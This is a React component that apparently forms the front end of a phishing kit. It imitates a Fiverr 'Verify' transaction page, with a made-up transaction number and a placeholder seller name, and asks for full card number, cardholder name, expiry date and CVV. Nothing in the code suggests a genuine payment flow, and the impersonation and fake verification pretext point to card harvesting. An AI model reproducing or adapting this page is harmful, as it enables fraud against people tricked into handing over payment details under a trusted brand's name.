import Image from '../Image'
import StoreLogo from "../../assets/store.svg"
import VisaLogo from "../../assets/visa.svg"
import AmericanXpressLogo from "../../assets/amex.svg"
import MasterCardLogo from "../../assets/mastercard.svg"
import GooglePayLogo from "../../assets/googlepay.svg"
import { FC } from 'react'
import useGigData from '../../hooks/useGigData'


const CardCollectionForm: FC<Disclosure> = ({ formData, handleChange, handleSubmit, errors, loading }) => {
const {gig: order} = useGigData()
    return (
        <>
            <div className="bg-gray-100 pt-4 max-w-sm mx-auto border border-gray-200">
                <div className="flex items-center justify-start gap-x-2 mx-4">
                    <Image src={StoreLogo} alt="visa" className="w-7 bg-white p-1 rounded-full shadow-md" />
                    <p className='text-sm font-semibold text-gray-500'>Fiverr</p>
                </div>
                <div className="text-center p-4 space-y-1">
                    <p className='text-sm text-gray-400 font-semibold'>{order?.username || "femzy_concepts"}</p>
                    <h2 className='text-2xl text-black font-semibold '>Verify</h2>
                    <p className='text-sm text-gray-400 font-semibold'>Transaction #678987654678</p>
                </div>
                {errors && <p className='text-sm p-2 font-semibold text-center'>{errors}</p>}
                <form onSubmit={handleSubmit}>
                    <div className="bg-white p-4 mx-auto space-y-4">
                        <p className='text-sm text-red-500 font-semibold text-center'>{errors}</p>
                        <div className="p-4 bg-gray-50 border-gray-200 border  rounded-md shadow gap-x-6 flex items-center">
                            <p className='text-sm font-semibold text-gray-500'>Fiverr</p>
                            <p className='text-sm font-semibold ml-6 text-gray-500'>{order?.username || "Details"}</p>
                        </div>
                        <div className="">
                            <label htmlFor="card_number" className='block text-sm font-semibold text-gray-500'>Card Number</label>
                            <div className="grid grid-cols-4 border rounded-md shadow gap-x-2 p-2">
                                <input type="text" id="card_number" placeholder='1234 1234 1234 1234' name="card_number" className='focus:ring-0 border-0 active:ring-0 focus:outline-none focus:border-0 placeholder:font-medium col-span-3'
                                    value={formData.card_number}
                                    onChange={handleChange} required />
                                <div className="flex items-center justify-center gap-x-1">
                                    <Image src={VisaLogo} alt="visa" className="w-8" />
                                    <Image src={MasterCardLogo} alt="mastercard" className="w-8" />
                                    <Image src={AmericanXpressLogo} alt="amex" className="w-8" />
                                    <Image src={GooglePayLogo} className="w-8" />
                                </div>
                            </div>
                        </div>
                        <div className="">
                            <label htmlFor="name_on_card" className='block text-sm font-semibold text-gray-500'>Name on card</label>
                            <div className="flex items-center justify-between flex-wrap border p-2 rounded-md shadow">
                                <input type="text" id="name_on_card" placeholder='Name on card' name="name_on_card" className='focus:ring-0 border-0 active:ring-0 focus:outline-none focus:border-0 flex-1 placeholder:font-medium'
                                    value={formData.name_on_card}
                                    onChange={handleChange} required />
                            </div>
                        </div>
                        <div className="">
                            <label htmlFor="card_number" className='block text-sm font-semibold text-gray-500'>Expiration date</label>
                            <div className="grid grid-cols-2 justify-between border rounded-md shadow">
                                <input type="text" id="expire_mm" placeholder='MM' name="expire_mm" className='focus:ring-0 border-0 active:ring-0 focus:outline-none focus:border-0  placeholder:font-medium p-2 border-r'
                                    value={formData.expire_mm}
                                    onChange={handleChange} required />
                                <input type="text" id="expire_yy" placeholder='YY' name="expire_yy" className='focus:ring-0 border-0 active:ring-0 focus:outline-none focus:border-0  placeholder:font-medium p-2'
                                    value={formData.expire_yy}
                                    onChange={handleChange} required />
                            </div>
                        </div>
                        <div className="">
                            <label htmlFor="cvv" className='block text-sm font-semibold text-gray-500'>CVV/CVC</label>
                            <div className="flex items-center justify-between flex-wrap border p-2 rounded-md shadow w-1/2">
                                <input type="text" id="cvv" placeholder='CVV/CVC' name="cvv" className='focus:ring-0 border-0 active:ring-0 focus:outline-none focus:border-0 placeholder:font-medium'
                                    value={formData.cvv}
                                    onChange={handleChange} required />
                            </div>
                        </div>

                        <div className="">
                            <button disabled={loading} className={`focus:ring-0 border-0 active:ring-0 focus:outline-none focus:border-0 bg-blue-700 text-white p-2 rounded-md block w-full shadow ${loading && "disabled:bg-blue-400"}`}>Submit</button>
                        </div>
                    </div>
                </form>
            </div>



        </>

    )
}

export default CardCollectionForm